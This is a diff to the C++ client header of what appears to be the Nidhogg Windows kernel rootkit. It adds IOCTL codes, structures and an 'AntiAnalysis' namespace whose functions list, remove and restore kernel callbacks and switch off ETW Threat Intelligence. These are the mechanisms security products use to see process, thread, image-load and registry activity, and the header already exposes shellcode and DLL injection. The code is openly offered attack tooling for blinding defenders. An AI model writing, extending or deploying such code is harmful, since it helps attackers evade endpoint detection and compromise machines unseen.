@@ -1,3 +1,4 @@
+#pragma once
 #include <Windows.h>
 #include <vector>
 #include <string>
@@ -35,6 +36,13 @@
 #define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_NIDHOGG_LIST_OBCALLBACKS CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_PSROUTINES CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_LIST_REGCALLBACKS CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_REMOVE_CALLBACK CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_RESTORE_CALLBACK CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 // ** General Definitions ***************************************************************************************
@@ -48,11 +56,13 @@
 
 #define MAX_PATCHED_MODULES 256
 #define MAX_FILES 256
+#define MAX_DRIVER_PATH 256
 
 #define PROCESS_TYPE_PROTECTED 0
 #define PROCESS_TYPE_SPOOFED 1
 #define MAX_PIDS 256
 #define MAX_TIDS 256
+#define MAX_ROUTINES 64
 
 #define REG_TYPE_PROTECTED_KEY 0
 #define REG_TYPE_PROTECTED_VALUE 1
@@ -103,9 +113,59 @@ enum InjectionType {
 	NtCreateThreadExInjection
 };
 
+enum CallbackType {
+	ObProcessType,
+	ObThreadType,
+	PsCreateProcessTypeEx,
+	PsCreateProcessType,
+	PsCreateThreadType,
+	PsCreateThreadTypeNonSystemThread,
+	PsImageLoadType,
+	CmRegistryType
+};
+
 // *********************************************************************************************************
 
 // ** General Structures ***************************************************************************************
+struct KernelCallback {
+	CallbackType Type;
+	ULONG64 CallbackAddress;
+};
+
+struct ObCallback {
+	PVOID PreOperation;
+	PVOID PostOperation;
+	CHAR DriverName[MAX_DRIVER_PATH];
+};
+
+struct PsRoutine {
+	ULONG64 CallbackAddress;
+	CHAR DriverName[MAX_DRIVER_PATH];
+};
+
+struct CmCallback {
+	ULONG64 CallbackAddress;
+	ULONG64 Context;
+	CHAR DriverName[MAX_DRIVER_PATH];
+};
+
+struct ObCallbacksList {
+	CallbackType Type;
+	ULONG NumberOfCallbacks;
+	ObCallback* Callbacks;
+};
+
+struct PsRoutinesList {
+	CallbackType Type;
+	ULONG NumberOfRoutines;
+	PsRoutine* Routines;
+};
+
+struct CmCallbacksList {
+	ULONG NumberOfCallbacks;
+	CmCallback* Callbacks;
+};
+
 struct PatchedModule {
 	ULONG Pid;
 	PVOID Patch;
@@ -994,6 +1054,139 @@ namespace Nidhogg {
 				return (PVOID)NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
 
 			return data;
+		}
+	}
+
+	namespace AntiAnalysis {
+		int NidhoggEnableDisableEtwTi(HANDLE hNidhogg, bool enable) {
+			DWORD returned;
+			ULONG enableDisable = enable;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_ENABLE_DISABLE_ETWTI,
+				&enableDisable, sizeof(enableDisable),
+				nullptr, 0, &returned, nullptr))
+				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+
+			return NIDHOGG_SUCCESS;
+		}
+
+		int NidhoggDisableCallback(HANDLE hNidhogg, ULONG64 callbackAddress, CallbackType callbackType) {
+			KernelCallback callback{};
+			DWORD returned;
+
+			callback.CallbackAddress = callbackAddress;
+			callback.Type = callbackType;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_REMOVE_CALLBACK,
+				&callback, sizeof(callback),
+				nullptr, 0, &returned, nullptr))
+				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+
+			return NIDHOGG_SUCCESS;
+		}
+
+		int NidhoggRestoreCallback(HANDLE hNidhogg, ULONG64 callbackAddress, CallbackType callbackType) {
+			KernelCallback callback{};
+			DWORD returned;
+
+			callback.CallbackAddress = callbackAddress;
+			callback.Type = callbackType;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_RESTORE_CALLBACK,
+				&callback, sizeof(callback),
+				nullptr, 0, &returned, nullptr))
+				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+
+			return NIDHOGG_SUCCESS;
+		}
+
+		CmCallbacksList NidhoggListRegistryCallbacks(HANDLE hNidhogg, int* success) {
+			CmCallbacksList callbacks{};
+			DWORD returned;
+			callbacks.Callbacks = (CmCallback*)malloc(MAX_ROUTINES * sizeof(CmCallback));
+
+			if (!callbacks.Callbacks) {
+				*success = NIDHOGG_GENERAL_ERROR;
+				return callbacks;
+			}
+			memset(callbacks.Callbacks, 0, MAX_ROUTINES * sizeof(PsRoutine));
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_REGCALLBACKS,
+				&callbacks, sizeof(callbacks),
+				&callbacks, sizeof(callbacks), &returned, nullptr)) {
+				*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+				free(callbacks.Callbacks);
+				return callbacks;
+			}
+			*success = NIDHOGG_SUCCESS;
+			return callbacks;
+		}
+
+		PsRoutinesList NidhoggListPsRoutines(HANDLE hNidhogg, CallbackType callbackType, int* success) {
+			PsRoutinesList routines{};
+			DWORD returned;
+			routines.Type = callbackType;
+			routines.Routines = (PsRoutine*)malloc(MAX_ROUTINES * sizeof(PsRoutine));
+
+			if (!routines.Routines) {
+				*success = NIDHOGG_GENERAL_ERROR;
+				return routines;
+			}
+			memset(routines.Routines, 0, MAX_ROUTINES * sizeof(PsRoutine));
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_PSROUTINES,
+				&routines, sizeof(routines),
+				&routines, sizeof(routines), &returned, nullptr)) {
+				*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+				free(routines.Routines);
+				return routines;
+			}
+			*success = NIDHOGG_SUCCESS;
+
+			return routines;
+		}
+
+		ObCallbacksList NidhoggListObCallbacks(HANDLE hNidhogg, CallbackType callbackType, int* success) {
+			ObCallbacksList callbacks{};
+			DWORD returned;
+			callbacks.NumberOfCallbacks = 0;
+			callbacks.Type = callbackType;
+
+			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_OBCALLBACKS,
+				&callbacks, sizeof(callbacks),
+				&callbacks, sizeof(callbacks), &returned, nullptr)) {
+				*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+				return callbacks;
+			}
+
+			if (callbackType == ObProcessType || callbackType == ObThreadType) {
+				if (callbacks.NumberOfCallbacks > 0) {
+					switch (callbackType) {
+					case ObProcessType:
+					case ObThreadType:
+						callbacks.Callbacks = (ObCallback*)malloc(callbacks.NumberOfCallbacks * sizeof(ObCallback));
+
+						if (!callbacks.Callbacks) {
+							*success = NIDHOGG_GENERAL_ERROR;
+							return callbacks;
+						}
+						memset(callbacks.Callbacks, 0, callbacks.NumberOfCallbacks * sizeof(ObCallback));
+
+						break;
+					}
+
+					if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_OBCALLBACKS,
+						&callbacks, sizeof(callbacks),
+						&callbacks, sizeof(callbacks), &returned, nullptr)) {
+						free(callbacks.Callbacks);
+						*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
+						return callbacks;
+					}
+				}
+			}
+
+			*success = NIDHOGG_SUCCESS;
+			return callbacks;
 		}
 	}
 }
